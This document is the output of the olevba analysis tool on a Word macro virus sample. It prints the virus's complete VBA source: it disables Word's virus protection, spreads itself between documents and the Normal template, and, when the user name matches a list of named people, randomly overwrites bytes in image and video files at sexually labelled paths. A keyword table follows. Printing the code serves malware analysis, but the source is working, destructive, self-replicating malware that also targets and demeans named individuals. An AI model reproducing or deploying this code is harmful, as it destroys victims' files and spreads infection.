olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gm-3075c899b0d61d0f385e6b6494a739e1ae7dc7d5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gm-3075c899b0d61d0f385e6b6494a739e1ae7dc7d5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim acd, ntt As Object
Dim MyEnemy$(20, 1)
Dim MyPhoto$(10)
Dim MyVideo$(6)
Dim MyExten$(5)
Dim zw As Byte
Const mrk = "èó àèà èàåñè îòâðù îçêç îèñðâéÀ .ÂðñíïñíÔíðâêìñ îàèèï ààóÊìñàîî .Â"
Private Sub document_open()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 If Not acd.codemodule.Find(mrk, 1, 1, 1000, 1000) Then acd.codemodule.deletelines 1, acd.codemodule.countoflines
 If Not ntt.codemodule.Find(mrk, 1, 1, 1000, 1000) Then ntt.codemodule.deletelines 1, ntt.codemodule.countoflines
End Sub
Private Sub document_close()
 On Error Resume Next
 Options.VirusProtection = False
 Set acd = ActiveDocument.VBProject.VBComponents.Item(1)
 Set ntt = NormalTemplate.VBProject.VBComponents.Item(1)
 s$ = ""
 If (acd.codemodule.countoflines <= 1) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  v2 = 1
  For v = 1 To ntt.codemodule.countoflines
   s$ = ntt.codemodule.lines(v, 1)
   If s$ <> "" Then
    acd.codemodule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 ActiveDocument.Save
 If ntt.codemodule.countoflines <= 1 Then
  v2 = 1
  For v = 1 To acd.codemodule.countoflines
   s$ = acd.codemodule.lines(v, 1)
   If s$ <> "" Then
    ntt.codemodule.insertlines v2, s$
    v2 = v2 + 1
   End If
  Next v
 End If
 NormalTemplate.Save
 'Retaliate
 MyEnemy$(0, 0) = "Ôðîëîâ Î. À."
 MyEnemy$(1, 0) = "Åìåëüÿíåíêî Â. Â."
 MyEnemy$(2, 0) = "Ïîäãîðíîâà Å. È."
 MyEnemy$(3, 0) = "Ìàòðîñîâà Îëüãà Åâãåíüåâíà"
 MyEnemy$(4, 0) = "Êîâàëåâà Î Þ"
 MyEnemy$(5, 0) = "Ìîñèí Ê. Ï."
 MyEnemy$(6, 0) = "Øàëûãèí Ï. Ñ."
 MyEnemy$(7, 0) = "Ëèõòåð Àíàòîëèé Ìèõàéëîâè÷"
 MyEnemy$(8, 0) = "À. Ì. Êàðïîâ"
 MyEnemy$(9, 0) = "Êîçëîâ Àíäðåé Àëåêñàíäðîâè÷"
 MyEnemy$(10, 0) = "Ïàâëîâà Îëüãà"
 MyEnemy$(11, 0) = "Äìèòðèåâ Ñåðãåé"
 MyEnemy$(12, 0) = "Bob Klein"
 MyEnemy$(13, 0) = "Jim Rein"
 MyEnemy$(14, 0) = "John A. Hopkins"
 MyEnemy$(15, 0) = "Garry Wood"
 MyEnemy$(17, 0) = "Debra Henriksen"
 MyEnemy$(18, 0) = "Patricia "
 MyEnemy$(19, 0) = "Hitler"
 
 For v = 0 To 19
  If (v <= 11) Or (v = 19) Then
   MyEnemy$(v, 1) = "C:\Ìîè äîêóìåíòû"
  Else
   MyEnemy$(v, 1) = "C:\My documents"
  End If
 Next v
 MyEnemy$(0, 1) = MyEnemy$(0, 1) + "\Òðàõàíüå\"
 MyEnemy$(1, 1) = MyEnemy$(1, 1) + "\Ïîðíî\"
 MyEnemy$(2, 1) = MyEnemy$(2, 1) + "\Ñåêñ\"
 MyEnemy$(3, 1) = MyEnemy$(3, 1) + "\Èçâðàùåíèÿ\"
 MyEnemy$(4, 1) = MyEnemy$(4, 1) + "\Òðàõ\"
 MyEnemy$(5, 1) = MyEnemy$(5, 1) + "\Êëóáíè÷êà\"
 MyEnemy$(6, 1) = MyEnemy$(6, 1) + "\Äåâóøêè\Ãåëÿ\"
 MyEnemy$(7, 1) = MyEnemy$(7, 1) + "\Ôîòêè äåâóøåê\Êîìèññàðîâà Àíãåëèíà Âèòàëüåâíà\"
 MyEnemy$(8, 1) = "C:\Òîëüêî äëÿ ìåíÿ\Ïîðíóõà\Ãåëêà\"
 MyEnemy$(9, 1) = MyEnemy$(9, 1) + "\Îáíàæåííàÿ íàòóðà\Àíãåëèíà\"
 MyEnemy$(10, 1) = MyEnemy$(10, 1) + "\Ñåêñ_êîëëåêöèÿ\Êîìèññàðîâà_À_Â\"
 MyEnemy$(11, 1) = MyEnemy$(11, 1) + "\Ëó÷øèå ïîïêè ãîðîäà\"
 MyEnemy$(12, 1) = MyEnemy$(12, 1) + "\Russian Porno\"
 MyEnemy$(13, 1) = MyEnemy$(13, 1) + "\Russian Girls\Comissarova\"
 MyEnemy$(14, 1) = MyEnemy$(14, 1) + "\Russian Fuck\Gelka"
 MyEnemy$(15, 1) = MyEnemy$(15, 1) + "\Nudo\G\"
 MyEnemy$(16, 1) = MyEnemy$(16, 1) + "\Sex Show 1\Gela\"
 MyEnemy$(17, 1) = MyEnemy$(17, 1) + "\Sex Collection\"
 MyEnemy$(18, 1) = MyEnemy$(18, 1) + "\Crazy Sex\"
 MyEnemy$(19, 1) = MyEnemy$(19, 1) + "\Âûñòàâêà ñåêñà\Ðîññèÿ\Àñòðàõàíü\"
 
 MyPhoto$(0) = "Angelina"
 MyPhoto$(1) = "Gela"
 MyPhoto$(2) = "Body_A"
 MyPhoto$(3) = "Fuck"
 MyPhoto$(4) = "Fuck_ass"
 MyPhoto$(5) = "Ass"
 MyPhoto$(6) = "Cnt"
 MyPhoto$(7) = "Klzm"
 MyPhoto$(8) = "Kk"
 MyPhoto$(9) = "Urn"
 
 MyVideo$(0) = "Gela&Seryj"
 MyVideo$(1) = "Gela&Vlad"
 MyVideo$(2) = "Gela&Tolja"
 MyVideo$(3) = "Gela&Oleg"
 MyVideo$(4) = "Gela_Urn"
 MyVideo$(5) = "Gela_Alone"
 
 MyExten$(0) = "jpg"
 MyExten$(1) = "gif"
 MyExten$(2) = "tif"
 MyExten$(3) = "avi"
 MyExten$(4) = "mpg"
 vic$ = ""
 On Error GoTo exit_
 FileNumber = FreeFile
 For en = 0 To 19
  If Application.UserName = MyEnemy$(en, 0) Then
   For vic_name = 0 To 15
    For vic_ext = 0 To 4
     For p_number = 0 To 40
      If vic_name <= 9 Then
       vic$ = MyPhoto$(vic_name)
      Else
       vic$ = MyVideo$(vic_name - 10)
      End If
      s$ = Trim(Str(p_number))
      While Len(s$) < 3
       s$ = "0" + s$
      Wend
      vic$ = vic$ + s$ + "." + MyExten$(vic_ext)
      Open MyEnemy$(en, 1) + vic$ For Input As #FileNumber
      Close #FileNumber
      Open MyEnemy$(en, 1) + vic$ For Binary Access Read Write As #FileNumber Len = 1
      pos = 0
      While Not EOF(FileNumber)
       pos = pos + 1
       Get #FileNumber, pos, zw
       If (Rnd > 0.35) And (Not EOF(FileNumber)) Then
        zw = Int(256 * Rnd)
        Put #FileNumber, pos, zw
       End If
      Wend
      Close #FileNumber
exit_: Resume h
h:
     Next p_number
    Next vic_ext
   Next vic_name
  End If
 Next en
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

